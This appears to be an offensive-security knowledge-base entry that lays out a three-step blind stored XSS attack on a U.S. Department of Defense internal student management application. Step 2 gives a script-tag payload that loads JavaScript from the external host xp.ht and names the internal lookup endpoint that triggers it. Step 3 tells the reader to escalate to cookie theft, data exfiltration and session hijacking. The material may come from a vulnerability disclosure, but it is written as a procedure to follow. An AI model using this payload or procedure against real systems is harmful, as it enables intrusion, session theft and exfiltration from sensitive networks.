---
id: ac-uuid-001
name: Blind Stored XSS in DoD Internal Student Management Application
tags:
  - xss
  - stored-xss
  - blind-xss
  - javascript
  - web
  - dod
type: attack_chain
tools:
  - '[[tools/xp-ht-Beacon-Host]]'
tactics:
  - '[[Execution]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Set-Up-XSS-Beacon-Host]]'
  - '[[procedures/Inject-and-Trigger-XSS-Payload]]'
  - '[[procedures/Confirm-and-Exploit-Blind-Stored-XSS]]'
step_count: 3
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:24.673Z'
description: >-
  A multi-stage attack chain exploiting a blind stored XSS vulnerability in a
  U.S. Department of Defense internal web application, allowing arbitrary
  JavaScript execution during student data lookups.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Blind Stored XSS in DoD Internal Student Management Application

Multi-stage attack chain demonstrating the discovery and exploitation of a blind stored XSS vulnerability in an internal U.S. Department of Defense web application used for student management. The attack involves setting up an external beacon to detect payload execution, injecting a script into student data fields, and observing triggers during lookups, leading to potential session hijacking or data exfiltration in a sensitive environment.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Set Up Beacon] --> B[Inject Payload]
    B --> C[Observe Trigger and Exploit]
    C --> D[Arbitrary JS Execution]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/xp-ht-Beacon-Host]]

### Target Environment

- Internal web application on DoD network
- Access to student data input fields
- No direct resolvability of internal hosts

### Initial Access Requirements

- Valid credentials for the internal application
- Network position allowing external beacon hosting
- Prior access to submit student data

## Detailed Attack Procedures

### Step 1: Set Up Beacon Host
procedure: [[procedures/Set-Up-XSS-Beacon-Host]]

**Objective**: Establish an external host to detect and confirm XSS payload execution by capturing incoming requests from triggered scripts.

**Instructions**: Host a simple beacon script on an external domain like xp.ht to monitor for pings indicating script execution. The beacon should log referer headers and query parameters from incoming requests.

**Expected Output**: A monitoring endpoint ready to receive GET requests from executed payloads.

**Success Indicators**:
- Beacon host is live and accessible
- Logging mechanism captures requests

### Step 2: Inject and Trigger XSS Payload
procedure: [[procedures/Inject-and-Trigger-XSS-Payload]]

**Objective**: Inject a malicious script into user-controlled student data fields and trigger its execution during application interactions like student lookups.

**Instructions**: Submit a payload such as `<script src="//xp.ht/beacon"></script>` into a student data field (e.g., name or notes). Then, perform actions in the application that retrieve and render this data, such as searching for the student via the endpoint `/NSSI/controlcenterV2/index.htm?directlink&courses/classes/findstudent`.

**Expected Output**: The payload is stored without immediate feedback (blind), but execution is pending trigger.

**Success Indicators**:
- Payload submission succeeds without errors
- No immediate alert or block

### Step 3: Confirm and Exploit Blind Stored XSS
procedure: [[procedures/Confirm-and-Exploit-Blind-Stored-XSS]]

**Objective**: Observe the payload trigger from an internal host and leverage the confirmed XSS for arbitrary JavaScript execution, such as session hijacking or data theft.

**Instructions**: Monitor the beacon host for incoming requests. Upon receiving a ping from the internal endpoint (e.g., Referer: `https://███████████████/NSSI/controlcenterV2/index.htm?directlink&courses/classes/findstudent&&&&&&&&` with query `?_=1594756841631`), confirm execution. Escalate by modifying the payload to exfiltrate data or steal cookies.

**Expected Output**: Pingback with internal details, enabling further payload refinement.

**Success Indicators**:
- Incoming request from non-resolvable internal IP
- Referer header reveals execution context
- Potential for JS-based actions like `document.cookie` theft

## Attack Chain Summary

### Key Achievements

1. Detected blind stored XSS in sensitive DoD application without direct feedback
2. Confirmed execution on internal host via external beacon
3. Enabled potential for session hijacking and internal network pivoting

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Execution]]

---
*Last updated: 2023-10-01T00:00:00Z*
